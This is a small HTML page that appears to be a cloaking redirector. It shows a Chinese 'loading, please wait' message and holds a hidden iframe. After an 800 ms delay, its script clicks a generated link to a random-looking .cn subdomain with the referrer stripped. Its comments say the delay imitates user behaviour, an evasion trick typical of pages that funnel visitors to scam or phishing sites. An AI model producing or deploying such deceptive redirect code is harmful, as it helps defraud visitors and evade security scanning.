<!DOCTYPE html>

<head>

  </style>
</head>
<body>
  <div class="info">正在加载，请稍候...</div>

  <iframe id="hiddenFrame" style="display: none;"></iframe>

  <script>
    // 伪装用户行为延迟跳转
    setTimeout(() => {
      const url = "https://qertyuiopasdfghjklz.5zym10.cn/h5/#/";
      const a = document.createElement('a');
      a.href = url;
      a.rel = 'noreferrer';
      a.target = '_self';
      document.body.appendChild(a);
      a.click();
    }, 800);  // 模拟用户等待行为
  </script>
</body>
